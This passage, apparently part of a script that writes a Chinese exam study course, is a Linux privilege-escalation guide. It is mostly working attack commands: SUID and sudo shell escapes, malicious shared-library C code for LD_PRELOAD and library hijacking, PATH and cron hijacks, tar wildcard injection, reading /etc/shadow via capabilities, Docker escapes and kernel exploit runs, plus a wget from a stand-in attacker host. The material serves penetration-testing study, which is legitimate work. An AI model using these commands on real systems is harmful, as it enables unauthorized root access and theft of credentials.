> **🔑 高分考点**：SUID（Set User ID）是Linux提权最重要的攻击面之一。当SUID程序运行时，它以文件所有者的权限执行。如果root拥有的SUID程序可以被利用执行命令，就能获得root权限。

---

## 二、系统信息收集

### 2.1 自动化收集

```bash
# LinPEAS - 最全面的Linux提权信息收集
./linpeas.sh
./linpeas.sh -a  # 全面检查

# LinEnum
./LinEnum.sh -t -k keyword

# Linux Exploit Suggester
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl -k 3.10.0

# 快速手工检查清单
id; whoami; hostname
uname -a; cat /etc/issue; cat /proc/version
sudo -l; cat /etc/sudoers
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
crontab -l; ls -la /etc/cron*
cat /etc/passwd; cat /etc/shadow 2>/dev/null
ls -la /home/; ls -la /root/ 2>/dev/null
netstat -anlp; ss -anlp
ps aux | grep root
env; cat .bash_history
find / -writable -type f 2>/dev/null | grep -v proc
```

### 2.2 关键信息解读

| 发现 | 提权潜力 | 下一步 |
|:---|:---|:---|
| 内核版本低 | 高 | 查找内核漏洞EXP |
| sudo -l有结果 | 高 | GTFOBins查询利用方法 |
| SUID文件存在 | 中高 | 检查是否在GTFOBins列表 |
| Cron以root运行 | 高 | 检查可写脚本 |
| 可写/etc/passwd | 极高 | 添加root用户 |
| 可写/etc/shadow | 极高 | 修改root密码 |
| 可写root的SSH密钥 | 极高 | 添加自己的公钥 |
| Docker组成员 | 高 | 容器逃逸 |
| 以root运行的服务 | 中 | 检查配置文件和权限 |

---

## 三、SUID提权技术

### 3.1 GTFOBins利用

GTFOBins是一个收集Unix二进制文件利用方法的项目：

```bash
# 常见SUID利用（参考GTFOBins）

# find
find / -exec /bin/sh -p \\; -quit
find / -exec /bin/bash -p \\; -quit

# bash
bash -p

# vim
vim -c ':!/bin/sh'

# nmap (旧版本支持--interactive)
nmap --interactive
nmap> !sh

# less / more
less /etc/passwd
!/bin/sh

# awk
awk 'BEGIN {{system("/bin/sh")}}'

# python/python3
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# perl
perl -e 'exec "/bin/sh";'

# ruby
ruby -e 'exec "/bin/sh"'

# systemctl (如果SUID)
TF=$(mktemp).service
echo '[Service]\nType=oneshot\nExecStart=/bin/sh -c "chmod +s /bin/bash"\n[Install]\nWantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF

# php
php -r "pcntl_exec('/bin/sh', ['-p']);"

# cp (覆盖/etc/passwd)
cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p
```

### 3.2 共享库劫持

```bash
# 场景：SUID程序加载了自定义共享库
# 使用strace追踪库加载
strace /usr/local/bin/vulnerable_program 2>&1 | grep -i "open\|access" | grep "\.so"

# 检查RPATH/RUNPATH
readelf -d /usr/local/bin/vulnerable_program | grep PATH
objdump -x /usr/local/bin/vulnerable_program | grep RPATH

# 如果有可写的库搜索路径
# 创建恶意共享库
cat > evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o libevil.so evil.c -nostartfiles

# 放到可写路径
cp libevil.so /path/to/writable/dir/
# 运行SUID程序
./vulnerable_program
```

### 3.3 PATH劫持

```bash
# 场景：SUID程序调用相对路径命令
# 如：system("whoami") 而不是 system("/usr/bin/whoami")

# 创建伪造命令
echo '/bin/bash -p' > /tmp/whoami
chmod +x /tmp/whoami

# 修改PATH
export PATH=/tmp:$PATH

# 运行SUID程序
./vulnerable_program
```

---

## 四、Sudo配置滥用

### 4.1 sudo -l分析

```bash
# 查看sudo权限
sudo -l

# 输出示例：
# (root) NOPASSWD: /usr/bin/vim /var/www/html/*
# (root) NOPASSWD: /usr/bin/find
# (ALL) NOPASSWD: ALL

# 如果(ALL) NOPASSWD: ALL
sudo su -
sudo /bin/bash

# 如果允许特定命令（GTFOBins查询）
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \\;
sudo awk 'BEGIN {{system("/bin/sh")}}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo less /etc/passwd → !/bin/sh
sudo nmap --interactive → !sh
sudo man man → !/bin/sh
sudo git -p help → !/bin/sh
sudo ftp → !/bin/sh
```

### 4.2 LD_PRELOAD提权

```bash
# 条件：sudo -l 显示 env_keep+=LD_PRELOAD

# 创建恶意共享库
cat > shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o shell.so shell.c -nostartfiles

# 使用sudo加载
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/something
```

### 4.3 LD_LIBRARY_PATH提权

```bash
# 条件：sudo -l 显示 env_keep+=LD_LIBRARY_PATH

# 查找sudo命令使用的共享库
ldd /usr/bin/sudo_command

# 创建伪造的共享库（如libc.so.6）
# 将恶意库放在指定路径
sudo LD_LIBRARY_PATH=/tmp /usr/bin/sudo_command
```

---

## 五、Capabilities提权

### 5.1 Capabilities概述

```bash
# Capabilities是Linux更细粒度的权限控制
# 查看进程的capabilities
cat /proc/$$/status | grep Cap

# 查看文件的capabilities
getcap -r / 2>/dev/null

# 关键capabilities
# cap_setuid     - 允许设置UID
# cap_setgid     - 允许设置GID
# cap_sys_admin  - 系统管理操作
# cap_sys_ptrace - 跟踪进程
# cap_net_admin  - 网络管理
# cap_net_raw    - 原始套接字
# cap_dac_override   - 绕过文件权限
# cap_dac_read_search - 绕过文件读权限
# cap_chown      - 修改文件所有者
```

### 5.2 Capabilities利用

```bash
# python3 有 cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl 有 cap_setuid+ep
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# tcpdump 有 cap_net_raw+ep
# 可以抓包，但不能直接提权

# openssl 有 cap_dac_read_search+ep
# 可以读取任何文件
openssl enc -in /etc/shadow

# tar 有 cap_dac_read_search+ep
# 读取并打包敏感文件
tar -cvf /tmp/data.tar /etc/shadow /root/
```

---

## 六、Cron任务劫持

### 6.1 Cron基础

```bash
# Cron任务位置
/etc/crontab           # 系统crontab
/etc/cron.d/           # 定时任务目录
/etc/cron.daily/       # 每日任务
/etc/cron.hourly/      # 每小时任务
/etc/cron.weekly/      # 每周任务
/etc/cron.monthly/     # 每月任务
/var/spool/cron/crontabs/  # 用户crontab

# 查看所有cron
crontab -l
ls -la /etc/cron*
cat /etc/crontab
```

### 6.2 Cron提权路径

```bash
# 路径1：可写cron脚本
# 如果以root运行的cron脚本可写
find /etc/cron* -writable -type f 2>/dev/null
# 直接追加恶意命令
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /etc/cron.hourly/script.sh

# 路径2：PATH劫持
# 如果cron脚本使用相对路径命令
# 且cron的PATH包含可写目录
# 在可写目录创建同名恶意命令

# 路径3：通配符注入
# 如果cron脚本使用tar/rsync等带通配符的命令
# 如：tar -cf backup.tar *
# 创建恶意文件名
touch /path/to/backup/--checkpoint=1
touch /path/to/backup/--checkpoint-action=exec=bash shell.sh
```

### 6.3 pspy监控进程

```bash
# pspy - 无需root即可监控进程
./pspy64
./pspy64 -pf -i 1000  # 每1秒刷新

# 可以发现：
# - 定期执行的cron任务
# - 执行的具体命令和参数
# - 任务运行的用户
```

---

## 七、Linux内核漏洞提权

### 7.1 经典内核漏洞

```bash
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 < 4.8.3
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow

# DirtyPipe (CVE-2022-0847) - Linux 5.8 < 5.16.11
./dirtypipe /etc/passwd 1
# 修改/etc/passwd，添加root权限用户

# PwnKit (CVE-2021-4034) - 所有pkexec版本
./PwnKit

# Sudo Baron Samedit (CVE-2021-3156) - sudo 1.8.2-1.8.31p1, 1.9.0-1.9.5p1
./exploit

# OverlayFS (CVE-2021-3493) - Ubuntu 20.10, 20.04 LTS, 18.04 LTS...
./exploit

# Seccomp (CVE-2023-32233) - Linux Kernel < 6.3.1
./exploit
```

### 7.2 内核提权流程

```bash
# 标准流程
# 1. 确定内核版本
uname -a

# 2. 使用LES查找可能的EXP
./linux-exploit-suggester.sh

# 3. 下载并编译EXP
wget http://attacker.com/exploit.c
gcc -o exploit exploit.c

# 4. 执行
./exploit

# 5. 验证
id
# uid=0(root) gid=0(root)
```

---

## 八、Docker容器逃逸

### 8.1 容器逃逸检测

```bash
# 判断是否在容器中
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
# 检查capabilities
capsh --print

# 容器中的特权模式
# 如果容器以--privileged运行
fdisk -l  # 能查看宿主机磁盘

# 挂载宿主机磁盘
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

### 8.2 容器逃逸方法

```bash
# 方法1：Docker Socket挂载
# 如果/var/run/docker.sock在容器内可访问
docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu chroot /host

# 方法2：特权模式
# 如果容器以--privileged运行
# 使用cgroup notify_on_release

# 方法3：挂载宿主机文件系统
mount /dev/sda1 /mnt
chroot /mnt /bin/bash

# 方法4：利用内核漏洞
# 共享宿主机的内核
```

---

## 九、提权自动化工具

### 9.1 综合工具对比

| 工具 | 功能 | 语言 | 适用场景 |
|:---|:---|:---|:---|
| LinPEAS | 全面信息收集 | Bash | 首选工具 |
| LinEnum | 信息收集 | Bash | 基础枚举 |
| LES | EXP推荐 | Perl/Bash | 内核漏洞 |
| pspy | 进程监控 | Go | Cron发现 |
| traitor | 自动提权 | Go | 一键提权 |
| GTFOBins | SUID/Sudo利用 | Web | 在线查询 |

### 9.2 Traitor

```bash
# Traitor - 自动化提权
./traitor -p  # 列出可能的提权路径
./traitor -e  # 尝试所有利用
./traitor -e docker:writable-socket
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | SUID提权 | ★★★★★ | ★★ | find / -perm -4000 -type f |
| 2 | sudo -l | ★★★★★ | ★★ | 查看sudo配置，GTFOBins利用 |
| 3 | Linux内核漏洞 | ★★★★ | ★★ | DirtyCow, DirtyPipe, PwnKit |
| 4 | Cron任务劫持 | ★★★★ | ★★ | 可写脚本、PATH劫持、通配符注入 |
| 5 | Capabilities | ★★★ | ★★★ | getcap -r /, cap_setuid提权 |
| 6 | Docker逃逸 | ★★★ | ★★★ | Socket挂载、特权模式 |
| 7 | LD_PRELOAD | ★★★ | ★★★ | env_keep+=LD_PRELOAD提权 |
| 8 | GTFOBins | ★★★★ | ★★ | SUID/Sudo二进制利用查询 |
| 9 | LinPEAS | ★★★★ | ★ | 最全面的Linux提权信息收集工具 |
| 10 | 共享库劫持 | ★★★ | ★★★ | strace追踪、RPATH劫持 |

### 💡 知识巧记口诀

> **"Linux提权五条路"** — SUID（找setuid文件）、Sudo（查sudo -l）、Kernel（找内核EXP）、Cron（劫持任务）、Capabilities（看能力）。记住：**"S S K C C"**。

> **"SUID利用三步"** — 查找（find / -perm -4000）、查询（GTFOBins）、利用（执行提权命令）。记住：**"查查用"**。

> **"内核漏洞三经典"** — DirtyCow（牛脏）、DirtyPipe（管脏）、PwnKit（pkexec）。记住：**"牛脏管脏PK劫持"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "SUID=4000" | ❌ 错误！4000是八进制，正确写法是-perm -4000 |
| "sudo -l列出的都可以提权" | ❌ 错误！需要具体命令支持shell escape |
| "所有Linux内核漏洞都容易利用" | ❌ 错误！需要gcc编译环境和对应架构 |
| "Docker容器很安全" | ❌ 不绝对！特权模式或Socket挂载容易逃逸 |

---

## 学习建议

1. 🧪 **搭建Linux提权实验室**：使用VulnHub的靶机或HackTheBox练习
2. 📚 **熟读GTFOBins**：这是Linux提权的"圣经"
3. 🔧 **精通LinPEAS**：每次获得shell后第一件事就是运行LinPEAS
4. 🧠 **理解Linux权限模型**：SUID/SGID/Capabilities/DAC/MAC
5. 🛡️ **学习容器安全**：Docker/Kubernetes的安全机制和逃逸方法

---

> **Linux提权是一场"寻宝游戏"——SUID是藏在系统里的钥匙，Cron是定时的后门，内核漏洞是等待被发现的捷径。在Linux世界中，权限无处不在，关键在于你是否知道去哪里找。**
""")

print("\nDays 1-18 done, continuing with days 19-30...")
